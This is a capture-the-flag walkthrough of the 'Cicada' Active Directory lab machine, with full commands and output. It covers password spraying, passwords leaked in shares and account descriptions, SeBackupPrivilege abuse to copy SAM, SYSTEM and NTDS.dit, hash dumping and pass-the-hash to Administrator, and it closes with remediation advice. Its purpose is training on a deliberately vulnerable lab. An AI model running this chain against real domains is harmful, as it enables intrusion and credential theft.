## Executive Summary

This comprehensive penetration testing walkthrough documents the complete compromise of the Cicada Active Directory environment, from initial reconnaissance to full domain administrator access.

## 1. Reconnaissance Phase

### 1.1 Network Scanning

**Command:**

```bash
sudo nmap -sC -sV  10.129.33.92  --open
```

**Findings:**

- **Domain Controller Identification**: Hostname `CICADA-DC.cicada.htb`
    
- **Open Ports & Services**:
    
    - **53/tcp**: DNS (Domain Services)
        
    - **88/tcp**: Kerberos Authentication
        
    - **135/tcp**: RPC Endpoint Mapper
        
    - **139/tcp**: NetBIOS Session Service
        
    - **389/tcp**: LDAP (Active Directory)
        
    - **445/tcp**: SMB (File Sharing)
        
    - **464/tcp**: Kerberos Password Change
        
    - **593/tcp**: RPC over HTTP
        
    - **636/tcp**: LDAPS (Secure LDAP)
        
    - **3268/3269/tcp**: Global Catalog LDAP/LDAPS
        
    - **5985/tcp**: WinRM (Windows Remote Management)
        

**Key Discovery**: Windows Server 2022 Domain Controller with full Active Directory services.

```output
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-06 10:53:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-06T10:55:04+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-11-06T10:55:05+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-06T10:55:04+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-11-06T10:55:05+00:00; +7h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## 2. Enumeration Phase

### 2.1 SMB Service Discovery

**Command:**

```bash
nxc smb  10.129.33.92                                                    
SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
                                                                                            
```

**Findings:**

- Domain: `cicada.htb`
    
- OS: Windows Server 2022 Build 20348
    
- SMB Signing: Enabled
- 
### 1.2 Hosts File Configuration

**Command:**

```bash
cat /etc/hosts
10.129.33.92  DC  cicada.htb  DC.cicada.htb
```

### 2.2 SMB Share Enumeration

**Command:**

```bash
 nxc smb  10.129.33.92 -u 'anonymous' -p '' --shares
SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\anonymous: (Guest)
SMB         10.129.33.92    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.33.92    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.33.92    445    CICADA-DC        -----           -----------     ------
SMB         10.129.33.92    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.33.92    445    CICADA-DC        C$                              Default share
SMB         10.129.33.92    445    CICADA-DC        DEV                             
SMB         10.129.33.92    445    CICADA-DC        HR              READ            
SMB         10.129.33.92    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.33.92    445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.33.92    445    CICADA-DC        SYSVOL                          Logon server share 
```
**Discovered Shares:**

- `ADMIN$` (Remote Admin)
    
- `C$` (Default share)
    
- `DEV` (Custom share)
    
- `HR` (READ permissions)
    
- `IPC$` (READ, Remote IPC)
    
- `NETLOGON` (Logon server share)
    
- `SYSVOL` (Logon server share)

### 2.3 HR Share Investigation

**Command:**

```bash
smbclient //10.129.33.92/HR -N      
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 12:29:09 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 17:31:48 2024

                4168447 blocks of size 4096. 477569 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)
smb: \> exit
```

**Critical Finding**: Retrieved "Notice from HR.txt" containing:

- Default employee password: `Cicada$M6Corpb*@Lp#nZp!8`
    
- Welcome message for new hires
    
- Password change instructions

## 3. User Enumeration & Password Spraying

### 3.1 RID Brute-Force Attack

**Command:**

```bash
nxc smb 10.129.33.92 -u guest -p '' --rid-brute
SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.33.92    445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.33.92    445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.33.92    445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.33.92    445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.33.92    445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.33.92    445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.33.92    445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.33.92    445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
**Extracted Users:**

- Administrator (500)
    
- Guest (501)
    
- krbtgt (502)
    
- john.smoulder (1104)
    
- sarah.dantelia (1105)
    
- **michael.wrightson (1106)**
    
- david.orelious (1108)
    
- emily.oscars (1601)

```bash
 nxc smb    10.129.33.92  -u guest -p '' --rid-brute | awk -F'\\\\' '/CICADA/{print $2}' | awk '{print $1}'>users.txt
```

```bash
cat 'Notice from HR.txt' 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp


```

### 3.2 Password Spraying Attack

**Command:**


```bash
nxc smb    10.129.33.92  -u users.txt -p  'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success

SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\guest::Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Cert:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Schema:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Group:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Read-only:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Cloneable:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Protected:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Key:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\RAS:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Allowed:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Denied:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\DnsAdmins:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\DnsUpdateProxy:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Groups:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
SMB         10.129.33.92    445    CICADA-DC        [-] cicada.htb\emily.oscars:Ci
                      
```
**Successful Authentication**: `michael.wrightson` with the default password.

### 3.3 User Information Enumeration

**Command:**

```bash
nxc smb   10.129.33.92  -u michael.wrightson  -p  'Cicada$M6Corpb*@Lp#nZp!8' --users

SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.33.92    445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.33.92    445    CICADA-DC        Administrator                 2024-08-26 20:08:03 3       Built-in account for administering the computer/domain 
SMB         10.129.33.92    445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.129.33.92    445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 3       Key Distribution Center Service Account 
SMB         10.129.33.92    445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 3        
SMB         10.129.33.92    445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 3        
SMB         10.129.33.92    445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.33.92    445    CICADA-DC        david.orelious                2024-03-14 12:17:29 3       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.33.92    445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 3        
SMB         10.129.33.92    445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

**Critical Discovery**: David Orelious had a password hint in his description:

- Password: `aRt$Lp#7t*VQ!3`
## 4. Lateral Movement

### 4.1 David Orelious Account Access

**Command:**

```bash
nxc smb   10.129.33.92  -u david.orelious -p 'aRt$Lp#7t*VQ!3' 
SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
```

**Successful Authentication**: Gained access as david.orelious.

### 4.2 DEV Share Exploration

**Command:**

```bash
nxc smb   10.129.33.92  -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.33.92    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB         10.129.33.92    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.33.92    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.33.92    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.33.92    445    CICADA-DC        -----           -----------     ------
SMB         10.129.33.92    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.33.92    445    CICADA-DC        C$                              Default share
SMB         10.129.33.92    445    CICADA-DC        DEV             READ            
SMB         10.129.33.92    445    CICADA-DC        HR              READ            
SMB         10.129.33.92    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.33.92    445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.33.92    445    CICADA-DC        SYSVOL          READ            Logon server share 
```

**Critical Finding**: Retrieved `Backup_script.ps1` containing:

- Emily Oscars' credentials: `emily.oscars:Q!3@Lp#M6b*7t*Vt`

```bash
smbclient //10.129.33.92/DEV  -U david.orelious 
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 12:31:39 2024
  ..                                  D        0  Thu Mar 14 12:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 17:28:22 2024

                4168447 blocks of size 4096. 478451 blocks available
smb: \> get  Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (8.8 KiloBytes/sec) (average 8.8 KiloBytes/sec)
smb: \> exit
```

```bash
cat 'Backup_script.ps1'                                         

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

## 5. Privilege Escalation

### 5.1 WinRM Access with Emily Oscars

**Command:**

```bash
 nxc winrm 10.129.33.92  -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'     
WINRM       10.129.33.92    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.33.92    5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```
**Result**: Successful WinRM access with `Pwn3d!` status.

### 5.2 Initial Foothold

**Command:**

```bash
evil-winrm -i 10.129.33.92 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

**User Flag Captured**:
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
e1a784cbf8842d3a750e5dd9eccf805c
```

### 5.3 Privilege Assessment

**Command:**

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Critical Privileges Identified**:

- `SeBackupPrivilege` (Enabled) - Critical for backup operations
    
- `SeRestorePrivilege` (Enabled) - Critical for restore operations
    
- Plus other standard privileges
## 6. Domain Compromise

### 6.1 Disk Shadow Copy Creation

**Technique**: Abuse SeBackupPrivilege with DiskShadow

**Commands:**
```bash
*Evil-WinRM* PS C:\ProgramData> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
*Evil-WinRM* PS C:\ProgramData> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\ProgramData> echo "create" | out-file ./diskshadow.txt -encoding ascii -append 
*Evil-WinRM* PS C:\ProgramData> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

**Result**: Successfully created shadow copy mounted as Z: drive.


```bash
Evil-WinRM* PS C:\ProgramData> diskshadow.exe /s C:\ProgramData\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  11/6/2025 4:17:59 AM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {7d422ad2-a7be-463d-8864-c6c94aae934e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {be4b859a-d2e7-4ff1-a941-cbb205ae30a0} set as environment variable.

Querying all shadow copies with the shadow copy set ID {be4b859a-d2e7-4ff1-a941-cbb205ae30a0}

        * Shadow copy ID = {7d422ad2-a7be-463d-8864-c6c94aae934e}               %temp%
                - Shadow copy set: {be4b859a-d2e7-4ff1-a941-cbb205ae30a0}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 11/6/2025 4:18:00 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {7d422ad2-a7be-463d-8864-c6c94aae934e}
The shadow copy was successfully exposed as z:\.
```

### 6.2 Critical File Extraction

**SAM Database:**

```bash
*Evil-WinRM* PS C:\ProgramData> robocopy /b Z:\Windows\System32\Config C:\ProgramData  SAM

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, November 6, 2025 4:19:11 AM
   Source : Z:\Windows\System32\Config\
     Dest : C:\ProgramData\

    Files : SAM

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\System32\Config\
            New File               65536        SAM
  0%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :    64.0 k    64.0 k         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Thursday, November 6, 2025 4:19:11 AM


```

**SYSTEM Registry:**

```bash
Evil-WinRM* PS C:\ProgramData> robocopy /b Z:\Windows\System32\Config C:\ProgramData  SYSTEM
 

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, November 6, 2025 4:20:08 AM
   Source : Z:\Windows\System32\Config\
     Dest : C:\ProgramData\

    Files : SYSTEM

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\System32\Config\
            New File              18.0 m        SYSTEM


```

**NTDS.dit (Active Directory Database):**


```bash
*Evil-WinRM* PS C:\ProgramData> robocopy /b Z:\Windows\NTDS C:\ProgramData  ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, November 6, 2025 4:24:00 AM
   Source : Z:\Windows\NTDS\
     Dest : C:\ProgramData\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\NTDS\
            New File              16.0 m        ntds.dit


```

### 6.3 File Download to Attacker Machine

```bash
*Evil-WinRM* PS C:\ProgramData> download SAM
 
                                        
Info: Downloading C:\ProgramData\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\ProgramData> download SYSTEM
 
                                        
Info: Downloading C:\ProgramData\SYSTEM to SYSTEM
                                        
Info: Download successful!

*Evil-WinRM* PS C:\ProgramData> download ntds.dit
 
                                        
Info: Downloading C:\ProgramData\ntds.dit to ntds.dit
                                        
Info: Download successful!


```

### 6.4 Credential Extraction

**Command:**


```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Extracted Administrator Hash**:

## 7. Final Domain Compromise

### 7.1 Administrator Access

**Command:**

```bash
evil-winrm -i 10.129.33.92 -u 'Administrator' -H  2b87e7c93a3e8a0ea4a581937016f341
```

### 7.2 Root Flag Capture

**Root Flag**:

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3bdad38142a8b8a214c76c9124ca7ff9
```

## 8. Attack Path Summary

1. **Information Disclosure**: Default password in HR share
    
2. **Password Spraying**: Successful authentication as michael.wrightson
    
3. **User Enumeration**: Discovered david.orelious password in description
    
4. **Lateral Movement**: Accessed DEV share with david's credentials
    
5. **Credential Discovery**: Found emily.oscars credentials in backup script
    
6. **Privilege Escalation**: Abused SeBackupPrivilege to extract SAM/SYSTEM/NTDS
    
7. **Credential Dumping**: Extracted Administrator NTLM hash
    
8. **Domain Admin**: Full domain compromise achieved


## 9. Security Recommendations

### Critical Issues:

1. **Default Passwords**: Remove default passwords for new hires
    
2. **Password in Descriptions**: Never store credentials in user descriptions
    
3. **Credentials in Scripts**: Avoid hardcoded credentials in scripts
    
4. **Privilege Assignment**: Review SeBackupPrivilege assignments
    
5. **Share Permissions**: Restrict access to sensitive shares


### Remediation:

- Implement password policies requiring immediate change
    
- Regular audit of user account descriptions
    
- Remove unnecessary privileges from standard users
    
- Monitor for shadow copy creation events
    
- Implement credential scanning in scripts
    

This walkthrough demonstrates a complete attack chain from external reconnaissance to full domain compromise, highlighting multiple critical security vulnerabilities in the Cicada environment.
